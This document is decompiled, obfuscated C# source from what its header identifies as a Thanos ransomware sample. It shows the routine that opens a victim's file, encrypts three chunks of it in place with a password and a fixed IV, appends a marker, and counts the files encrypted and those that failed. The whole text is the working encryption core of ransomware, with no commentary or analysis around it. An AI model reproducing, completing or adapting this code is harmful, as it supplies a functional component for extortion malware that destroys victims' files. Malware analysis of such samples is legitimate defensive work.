// Decompiled with JetBrains decompiler
// Type: frgoWklvEOSV.dsNajfALrLtCLf
// Assembly: chaddad, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6BDE87D8-B0AC-468F-B40C-8A894553F651
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Thanos.gen-66ed5384220ff3091903e14a54849f824fdd13ac70dc4e0127eb59c1de801fc2.exe

using oFbodOYJTt;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace frgoWklvEOSV
{
  internal sealed class dsNajfALrLtCLf
  {
    [NonSerialized]
    internal static GetString \u0016;

    public static int sQtvooBwdOBCxEbJ([In] long obj0) => (int) obj0;

    public static bool PPfLKlDWqkz(
      string HZYgReqeZdwiOhP,
      string FggDlgbNzlN,
      string swyyhWDxghLYiaP,
      byte[] AJmlkCccFa = null)
    {
      try
      {
        using (FileStream fileStream = new FileStream(HZYgReqeZdwiOhP, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
        {
          int num1 = dsNajfALrLtCLf.sQtvooBwdOBCxEbJ(fileStream.Length) / 3;
          if (num1 < 0)
            num1 *= -1;
          int num2;
          try
          {
            num2 = Convert.ToInt32(FggDlgbNzlN) * Convert.ToInt32(fileStream.Length) / 100 / 2;
            if (num2 < 0)
              num2 *= -1;
          }
          catch
          {
            num2 = 107374182;
          }
          if (num1 <= num2 - Convert.ToInt32(FggDlgbNzlN) * 1024 * 1024)
            num2 = (num1 - Convert.ToInt32(FggDlgbNzlN) * 1024 * 1024) / 10;
          int num3 = 32;
          int QvcuhtejDQtivdh = (int) Math.Round((double) num2 / (double) num3, MidpointRounding.AwayFromZero) * num3;
          for (int index = 0; index < 3; ++index)
          {
            byte[] numArray = dsNajfALrLtCLf.ykfZNBAtxOgnLFR(HZYgReqeZdwiOhP, fileStream, QvcuhtejDQtivdh, num1 * index);
            byte[] yoyQQTyFZL;
            if (!PFruJiQrcriiZ.VGKELVlTFUV)
              yoyQQTyFZL = fkozHCDTDrY.GVHcoGquozRzL(numArray, Encoding.ASCII.GetBytes(swyyhWDxghLYiaP), new byte[8]
              {
                (byte) 1,
                (byte) 2,
                (byte) 3,
                (byte) 4,
                (byte) 5,
                (byte) 6,
                (byte) 7,
                (byte) 8
              });
            else
              yoyQQTyFZL = RpWKlAyYXuFg.pUQagweWpoRi(numArray, Encoding.ASCII.GetBytes(swyyhWDxghLYiaP), new byte[8]
              {
                (byte) 1,
                (byte) 2,
                (byte) 3,
                (byte) 4,
                (byte) 5,
                (byte) 6,
                (byte) 7,
                (byte) 8
              });
            dsNajfALrLtCLf.VQKAMVLwiHQGq(HZYgReqeZdwiOhP, fileStream, yoyQQTyFZL, num1 * index);
          }
        }
        byte[] buffer = PFruJiQrcriiZ.IooTTsvIiwCN ? Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(dsNajfALrLtCLf.\u0016(107399623)) + PFruJiQrcriiZ.GwTsezEgVAuVAU(dsNajfALrLtCLf.\u0016(107401288)) + Convert.ToString(FggDlgbNzlN) + PFruJiQrcriiZ.GwTsezEgVAuVAU(dsNajfALrLtCLf.\u0016(107401288))) : Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(dsNajfALrLtCLf.\u0016(107399623)) + PFruJiQrcriiZ.GwTsezEgVAuVAU(dsNajfALrLtCLf.\u0016(107401329)) + Convert.ToString(FggDlgbNzlN) + PFruJiQrcriiZ.GwTsezEgVAuVAU(dsNajfALrLtCLf.\u0016(107401329)));
        if (!PFruJiQrcriiZ.IooTTsvIiwCN)
        {
          using (FileStream fileStream = new FileStream(HZYgReqeZdwiOhP, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
            fileStream.Write(buffer, 0, buffer.Length);
        }
        else
        {
          using (FileStream fileStream = new FileStream(HZYgReqeZdwiOhP, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
          {
            fileStream.Write(AJmlkCccFa, 0, AJmlkCccFa.Length);
            fileStream.Write(buffer, 0, buffer.Length);
          }
        }
      }
      catch (Exception ex1)
      {
        if (PFruJiQrcriiZ.joesCNAxeHUI)
        {
          try
          {
            File.AppendAllText(PFruJiQrcriiZ.jnRLNtXuRRg, dsNajfALrLtCLf.\u0016(107386581) + HZYgReqeZdwiOhP + dsNajfALrLtCLf.\u0016(107399642) + ex1.Message + dsNajfALrLtCLf.\u0016(107396369));
          }
          catch (Exception ex2)
          {
          }
        }
        ++PFruJiQrcriiZ.iePhSHBTqLd;
        return false;
      }
      ++PFruJiQrcriiZ.XnicJWCgBOO;
      return true;
    }

    public static byte[] ykfZNBAtxOgnLFR(
      string EjwSrAUzZvKj,
      FileStream tHqOIEIJiPQebk,
      int QvcuhtejDQtivdh,
      int UPTryFWELOOWJHJY = 0)
    {
      byte[] buffer = new byte[QvcuhtejDQtivdh];
      tHqOIEIJiPQebk.Position = (long) UPTryFWELOOWJHJY;
      tHqOIEIJiPQebk.Read(buffer, 0, QvcuhtejDQtivdh);
      return buffer;
    }

    public static void VQKAMVLwiHQGq(
      string jctFitMebkeNhNmQ,
      FileStream JbNawZzPFxlR,
      byte[] yoyQQTyFZL,
      int VgSuiJKECvkU = 0)
    {
      JbNawZzPFxlR.Position = (long) VgSuiJKECvkU;
      JbNawZzPFxlR.Write(yoyQQTyFZL, 0, yoyQQTyFZL.Length);
    }

    static dsNajfALrLtCLf() => Strings.CreateGetStringDelegate(typeof (dsNajfALrLtCLf));
  }
}
